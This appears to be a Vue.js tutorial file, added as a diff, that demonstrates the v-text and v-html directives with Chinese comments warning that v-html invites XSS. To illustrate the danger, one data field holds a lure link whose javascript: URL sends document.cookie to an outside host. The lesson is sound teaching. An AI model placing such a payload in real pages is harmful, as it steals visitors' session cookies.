@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+
+    <title>内容渲染指令</title>
+    <!-- 1、引入开发版的 Vue , 在 window全局就有了Vue 这个构造函数 -->
+    <script src="./js/vue.js"></script>
+  </head>
+
+  <body>
+    <!-- 
+				v-html指令：
+						1.作用：向指定节点中渲染包含html结构的内容。
+						2.与插值语法的区别：
+									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+									(2).v-html可以识别html结构。
+						3.严重注意：v-html有安全性问题！！！！
+									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+		-->
+
+    <!--2、准备好一个容器，希望 Vue能够控制下面的这个div,帮我们再把数据填充到 div内部 -->
+    <div id="app">
+      <h3>欢迎来学习 内容渲染指令 {{name}}</h3>
+      <h3 v-text="str">123</h3>
+      <h3 v-html="str">123</h3>
+      <h3 v-html="str2"></h3>
+    </div>
+
+    <!-- 3、创建 Vue 的实例对象 -->
+    <script type="text/javascript">
+      //3.1、创建 Vue 实例  ，参数只能传一个对象 ，这种对象叫 配置对象
+      const vm = new Vue({
+        // el 属性 是固定写法，用于指定当前vm实例要控制页面上的哪个区域，接收的值 是一个 css选择器
+        el: "#app", // el : document.getElementById('root'),
+
+        // data 对象 就是要渲染到页面上的数据
+        data: {
+          name: "v-html", //怎么把 name渲染到页面上？
+          str: "开心学习！",
+          str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击有惊喜</a>',
+        },
+      });
+    </script>
+  </body>
+</html>
